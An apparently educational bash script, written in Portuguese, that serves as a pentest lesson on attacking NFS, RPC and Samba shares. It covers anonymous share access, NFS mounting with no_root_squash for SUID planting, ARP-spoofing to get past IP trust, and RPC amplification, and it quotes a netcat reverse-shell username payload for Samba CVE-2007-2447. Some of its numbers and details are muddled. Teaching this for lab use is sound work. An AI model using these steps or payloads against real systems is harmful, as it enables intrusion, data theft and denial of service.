#!/bin/bash
# ==============================================================================
# Módulo 3: Vulnerabilidades em Serviços
# Aula 04 - RPC, NFS, Samba (Os Caminhos Furtivos de Rede Interna)
# ==============================================================================
#
# 1. ANALOGIA DO DIA A DIA
# A Web é a fachada da loja. Mas atrás do estoque há as empilhadeiras compartilhadas e as 
# lixeiras conjuntas do Shopping, por onde fluem caixas e materiais pesados internamente (OS BACKUPS 
# E SHARES SMB). Os lixos de empresas grandes tem tesouros inestimáveis. Frequentemente os devs
# deixam um Share RPC escancarado sem querer pra repassar arquivos de build, usando a 
# mesma política "Ah, quem tá na DMZ minha é amigo... ". E o Hacker vestido de repositor 
# entra com uniforme roubado e pega a caixa inteira "Backup_DC_Domain.vdhk".
#
# 2. O QUE É (definição técnica Senior)
# Serviços de Arquivos Distribuídos compõem o Layer Interna de Servidores.
# - NFS (Network File System) TCP/UDP 2049, e seu gerenciador RPC Portmapper (111): Montagens Unix/Unix puras de drives remotos sem conceito forte de auth senhas-based na via original, estribam-se no UIDs.
# - Samba/SMB (Server Message Block) TCP 445: Ponte Microsoft para Linux. O Core de domínios Active Directories. As Nul Sessions (Logon sem user) permitem dumpar SAM databases e montar CIFS livres expondo código com perms globais.
#
# ==============================================================================
# 3. SCRIPT / COMANDO COMENTADO
# ==============================================================================

TARGET="127.0.0.1" 

# ==================== NFS (UDP/TCP 111, 2049) =======================
# Utilizando ferramenta Nativa do deamon NFS (showmount) no atacante
# Pra ele perguntar ativamente pro roteador de RPC o que há la dento exportado
echo "[+] Listando Diretórios NFS abertos da Máquina Remota (Show Mounts):"
# showmount -e $TARGET

# Como Ofender: MONTE OS ARQUIVOS O BANCO PRA SUA MAQUINA LINUX ATAQUE:
# Crio de um pasta falsa no meu Kali e jogo todo o Drive vulneravel dentro dela
# sudo mount -t nfs $TARGET:/var/backups_semanais /mnt/meu_furto_c_nfs

# ======================= SAMBA (TCP 139, 445) =======================
# Com o SMBClient, a navegação é estilo FTP command line!
# Uma busca por um cifs file chamado "$IPC" indica vulnerabilidade pra despejar dados vitais
echo "[+] Vasculhando Compartilhamentos de HD Ocultos do WINDOWS/SAMBA Linux:"
# smbclient -L //$TARGET/ -U ""%""

# Logando num share SMB vulnerável q a gente achou via Nmap Script (`smb-enum-shares`) sem senha 
# O share alvo chama "dados_financeiros" public.
# smbclient //$TARGET/dados_financeiros -U ""%"" 

# ==============================================================================
# 4. PASSO A PASSO
# ==============================================================================
# Passo 1: O NMAP identificou a porta 111 de Mapeador Portmap e nsf na 2049. 
# Passo 2: Vc roda o check e ve: `/home/developers *(rw,sync,no_root_squash)` liberado p/ o coringa `*` (qualquer IP).
# Passo 3: Criamos diretório de receptação em nossa casa: `mkdir /tmp/hacker_nfs_mount`.
# Passo 4: Montamos a partição de devs pra gente via `mountIP_Alvo:/home/developers /tmp/hacker_nfs_mount`.
# Passo 5: Ganhamos acesso brutal a todos os códigos fonte deles (que pode ter as senhas na AWS ou Banco) vivos em texto, como se fosse um PenDrive Injetado! E a flag magica no_root_squash no exports do otario? Ela significa q se eu rodar meu user atacante como "Root", o NFS respeita minha autoridade DE LÁ para o HOST ALVO e cravaria os arquivos lá DE ROOT taméem, permitindo injectar binaries SUID (Aula 02 de Privesc vindo de fora).
#
# 5. VERIFICAÇÃO E TROUBLESHOOTING
# Quando se monta e leva ERRO "mount.nfs: access denied by server", significa q o SysAdmin travou na origem `/etc/exports` explicitamente o range do SEU IP do laboratorio de fora. Esse é o Host-Based Auth que protege a fragilidade basica. O bypass sênior envolveria dar um spoofing ip arp pra fingir de maquina de outro Dev para engar o trust-ip, se estivessemos na LAN colisão bridge ou switch sem port-security 802.1X.
# 
# 6. CONCEITO SENIOR (o "porquê" profundo)
# O `rpcbind` (111) é um alvo glorioso de DDOS e exfiltração. Porque a arquitetura de RPC não foi nascida para a Web 3.0, os pacotes UDP respondidos pelo serviço NFS da corporaçao são maiores em factor de 10x do que o mini packet request da requisição do hacker. É amplificado. Assim Hackers Russos cospem 1MB falso ao server Linux pedindo RPC e forjam o cabecalho ip vitima para o server da Sony devolver 100MB de porrada sem auth na volta da vítima.
#
# 7. PERGUNTA DE ENTREVISTA / CTF
# Pergunta: "Seu scan achou SMBD rodando no Linux DMZ usando uma versão lendária e super antiga `Samba 3.0.20`. E você não tem nem senha, e o host está fechado com senha, você não ve os shares. Existe exploits automáticos como EternalBlue em Microsoft, mas em Samba do linux tão antigo na camada OS C qual a gravidade da CVE de username manipulado 'Username Map Script' (CVE-2007-2447)?"
# Resposta Esperada: Total System Compromise. O samba 3.0.2 passava a string do nome "username" inserida na Autenticação (prompt input) para a variável chamada no bash nativo de bash script nas confs do servidor. Se um hacker malicioso entrar com um Nome de usuário sendo os bizarros injetores de shell command bash tags `` `nohup nc -e /bin/sh ip 4444` ``, o binario nativo que parseava quebrava a string C em string OS Bash e executava AS ROOT o bagulho de rede! É O RCE mais fácil do mundo usando apenas uma string logando pelo SMBCLIENT.
